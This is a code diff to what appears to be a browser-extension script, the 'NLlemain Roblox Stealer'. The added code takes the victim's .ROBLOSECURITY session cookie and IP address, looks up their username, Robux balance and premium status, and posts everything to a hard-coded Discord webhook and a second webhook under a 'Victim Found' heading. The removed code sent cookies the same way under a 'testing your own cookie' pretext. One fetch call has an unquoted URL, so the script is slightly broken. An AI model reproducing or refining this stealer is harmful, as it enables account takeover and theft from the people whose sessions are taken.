@@ -1,24 +1,77 @@
-(async () => {
-    // YOUR webhook
-    const webhook = "https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo";
+const WEBHOOK = "webhook_1";
+const SECOND_WEBHOOK = "webhook_2"; //add the web hook here
 
-    // Roblox cookie (only YOURS because you're running this on YOUR device)
-    const cookie = document.cookie;
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
 
-    // If there's no Roblox cookie, nothing happens
-    if (!cookie.includes(".ROBLOSECURITY")) {
-        console.log("No Roblox cookie found on this browser.");
-        return;
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
     }
 
-    // Send to your webhook
-    await fetch(webhook, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-            content: `Your own cookie test:\n\`\`\`${cookie}\`\`\``
-        })
-    });
+    const payload = {
+        "content": null,
+        "embeds": [
+            {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                    {
+                        "name": "Username",
+                        "value": statistics ? statistics.UserName : "N/A",
+                        "inline": true
+                    },
+                    {
+                        "name": "Robux",
+                        "value": statistics ? statistics.RobuxBalance : "N/A",
+                        "inline": true
+                    },
+                    {
+                        "name": "Premium",
+                        "value": statistics ? statistics.IsPremium : "N/A",
+                        "inline": true
+                    }
+                ],
+                "author": {
+                    "name": "Victim Found: " + ipAddr,
+                    "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                },
+                "footer": {
+                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
+                },
+                "thumbnail": {
+                    "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                }
+            }
+        ],
+        "username": "NLlemain Roblox Stealer",
+        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
+        "attachments": []
+    };
 
-    console.log("Sent cookie to webhook!");
-})();
+
+    await Promise.all([
+        fetch(https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        }),
+        fetch(SECOND_WEBHOOK, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        })
+    ]);
+}
+
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
